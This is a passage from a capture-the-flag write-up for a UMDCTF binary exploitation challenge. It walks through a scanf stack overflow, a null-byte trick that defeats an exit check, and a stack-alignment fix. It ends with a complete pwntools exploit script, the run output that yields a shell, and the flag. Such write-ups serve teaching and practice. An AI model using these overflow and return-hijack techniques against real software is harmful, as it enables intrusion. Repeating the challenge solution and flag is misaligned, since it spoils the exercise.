type="1" id="34fa95c0-641b-80be-b28f-c01417398add" class="numbered-list" start="6"><li><code>check_valid_address(rbp-0xc0)</code> again needs 3 dots</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80cc-b5c2-c346dc076f00" class="numbered-list" start="7"><li><code>check_rine(rbp-0x90)</code> checks the hardcoded <code>&quot;0.0.0.0&quot;</code> string. We don’t control this argument directly.</li></ol></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8097-acf3-d52c028b52cc" class="">The <code>%s</code> at step 2 is the vulnerability. No bounds checking at all. But the <code>%48s</code> at step 5 is interesting too , that 48-character limit is <em>suspiciously</em> convenient given the stack layout.</p></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-8031-b7ba-dc54a724136b" class="">Putting it together</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80f1-8013-d5b03fc77331" class="">I need two things to happen:</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-801e-a6ff-c65b9f22bfab" class=""><strong>Problem 1: </strong><code><strong>check_rine</strong></code><strong> will call </strong><code><strong>exit(1)</strong></code></p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80d9-8fda-ea69ca7cf4c8" class=""><code>main</code> initializes <code>[rbp-0x90]</code> to <code>&quot;0.0.0.0&quot;</code> and passes it to <code>check_rine</code>. That matches the first <code>strcmp</code>, which calls <code>exit(1)</code>. The process dies. We never reach <code>main</code>’s <code>ret</code> instruction, so even if we’ve overwritten the return address, it doesn’t matter. We need to corrupt that <code>&quot;0.0.0.0&quot;</code> string.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80c6-abeb-c92b7f996be5" class="">Look at the distances: the dest host buffer starts at <code>[rbp-0xc0]</code> and the <code>&quot;0.0.0.0&quot;</code> string is at <code>[rbp-0x90]</code>. That’s <code>0xc0 - 0x90 = 0x30 = 48 bytes</code> apart. And <code>scanf(&quot;%48s&quot;)</code> reads up to… 48 characters. After the last character, <code>scanf</code> always writes a null terminator (<code>\\0</code>). So if I feed it exactly 48 characters, the data fills from <code>[rbp-0xc0]</code> through <code>[rbp-0x91]</code>, and the null byte lands squarely on <code>[rbp-0x90]</code> - the first character of <code>&quot;0.0.0.0&quot;</code>.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80ad-af4d-cd388d0aeee4" class="">That turns <code>&quot;0.0.0.0&quot;</code> into <code>&quot;&quot;</code> (empty string). Now <code>check_rine</code> gets <code>&quot;&quot;</code>:</p></div><div style="display:contents" dir="auto"><ul id="34fa95c0-641b-80b7-a734-debe59babc5f" class="bulleted-list"><li style="list-style-type:disc"><code>strcmp(&quot;&quot;, &quot;0.0.0.0&quot;)</code> - not equal so no <code>exit()</code></li></ul></div><div style="display:contents" dir="auto"><ul id="34fa95c0-641b-80dc-b5bf-fc6309214a79" class="bulleted-list"><li style="list-style-type:disc"><code>strcmp(&quot;&quot;, &quot;100.72.7.67&quot;)</code> - not equal so prints “Wrong RINE address!!” and returns</li></ul></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80a8-a4d7-c565b2b64b30" class="">And returning is exactly what we want. <code>main</code> reaches <code>ret</code>.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-809c-a396-e62c79e61f07" class=""><strong>Problem 2: </strong><code><strong>main</strong></code><strong> returns to the wrong place</strong></p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8024-a9b4-f007c534dbc6" class="">Now I need to hijack where <code>ret</code> goes. The source host buffer at <code>[rbp-0x60]</code> is read with <code>%s</code>  no limit. Writing upward from there:</p></div><div style="display:contents" dir="auto"><ul id="34fa95c0-641b-8080-84d8-d16f9cf501fd" class="bulleted-list"><li style="list-style-type:disc">96 bytes gets us from the buffer to the saved RBP at <code>[rbp+0x00]</code></li></ul></div><div style="display:contents" dir="auto"><ul id="34fa95c0-641b-8019-836f-e0de44e9f65b" class="bulleted-list"><li style="list-style-type:disc">8 more bytes overwrites the saved RBP</li></ul></div><div style="display:contents" dir="auto"><ul id="34fa95c0-641b-8043-9016-dc6f3e927c7e" class="bulleted-list"><li style="list-style-type:disc">The next 8 bytes is the return address at <code>[rbp+0x08]</code></li></ul></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8029-a140-de8fac6651d6" class="">Total padding: 104 bytes, then the address of <code>win</code>.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80b6-b70f-c2a484d83194" class="">Both payloads need exactly 3 dots to pass <code>check_valid_address</code>. Easy enough, I just stick the dots somewhere in the padding.</p></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-8011-a8c7-fe874490bcec" class="">The alignment pain</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8095-b27e-f61b845d9bce" class="">I wrote the first version, ran it, and… got EOF. No shell. The program jumped to <code>win</code>, but <code>system()</code> segfaulted.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8075-a1e2-fb2228332a95" class="">This one bit me for a minute before I realized: stack alignment.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8068-817f-c2e74dbef306" class="">The x86-64 ABI requires RSP to be 16-byte aligned before a <code>call</code> instruction. When you normally <code>call</code> a function, the <code>call</code> itself pushes the return address (8 bytes), so at the function entry point RSP is at 8 mod 16. The function’s prologue (<code>push rbp</code>) then brings it back to 0 mod 16. Everything is balanced.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8029-af87-df287c2c3ecd" class="">But we’re not <em>calling</em> <code>win</code> , we’re <em>returning</em> into it. <code>ret</code> pops 8 bytes (the return address) instead of pushing. So the alignment is flipped. When <code>win</code> does <code>push rbp</code> and then <code>call system</code>, the stack ends up misaligned by 8 bytes. <code>system()</code> uses SSE instructions internally (<code>movaps</code>) that require 16-byte alignment, and it segfaults.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-802c-b434-d2f3e95bea3d" class="">The fix: instead of returning to the start of <code>win</code> (<code>0x402f45</code>), return to <code>win+4</code> (<code>0x402f49</code>), which skips the <code>push rbp; mov rbp, rsp</code> prologue and goes straight to the <code>lea</code>/<code>call system</code> sequence. Without the extra <code>push</code>, the alignment works out:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8090-a0d8-dd02c9d3bb82" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">main&#x27;s ret:    RSP = 0 mod 16 (aligned)
+               jumps to win+4
+               (no push rbp)
+call system:   pushes return addr, RSP = 8 mod 16 at entry</code></pre></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-80fc-9bde-ef99dc34ce82" class="">Exploit</h2></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="34fa95c0-641b-80d6-9a9b-f0313e035d19" class="code code-wrap"><code class="language-python" style="white-space:pre-wrap;word-break:break-all">from pwn import *
+
+context.arch = &#x27;amd64&#x27;
+
+win = 0x402f49  # win+4
+
+src = b&#x27;A&#x27; * 101 + b&#x27;...&#x27; + p64(win)[:3]
+
+dst = b&#x27;A&#x27; * 45 + b&#x27;...&#x27;
+
+r = remote(&#x27;challs.umdctf.io&#x27;, 30308)
+
+r.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;asdf&#x27;)
+r.sendlineafter(b&#x27;&gt; &#x27;, src)
+r.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;asdf&#x27;)
+r.sendlineafter(b&#x27;&gt; &#x27;, dst)
+
+r.sendline(b&#x27;cat flag*&#x27;)
+r.interactive()</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-803c-81e4-c5449ac86be3" class="">A note on the source payload: <code>p64(win)[:3]</code> gives us the first three bytes of <code>0x402f49</code> in little-endian. We only need to write three bytes because the original return address (somewhere in the 0x40XXXX range) already has <code>\\x00</code> in its upper bytes. <code>scanf</code>’s null terminator covers the fourth byte. The remaining four bytes stay as <code>\\x00</code> from the original value. End result: the return address is exactly <code>0x0000000000402f49</code>.</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-802a-a9a2-db6631ebd04d" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">$ python3 ye.py
+[+] Opening connection to challs.umdctf.io on port 30308: Done
+[*] Switching to interactive mode
+Wrong RINE address!! Perhaps you were looking for 100.72.7.67
+UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80c0-bc07-c4597df29123" class="">The “Wrong RINE address!!” confirms our null byte trick worked -<code>check_rine</code> got an empty string, didn’t match either hardcoded IP, printed the error, and returned. Then <code>main</code> hit <code>ret</code>, popped our overwritten address, jumped to <code>win+4</code>, and <code>system(&quot;/bin/sh&quot;)</code> gave us a shell.</p></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-805d-a4a3-d9a7a376525c" class="">Flag</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8064-bce3-f96b72a1e3bc" class=""><code>UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}</code></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
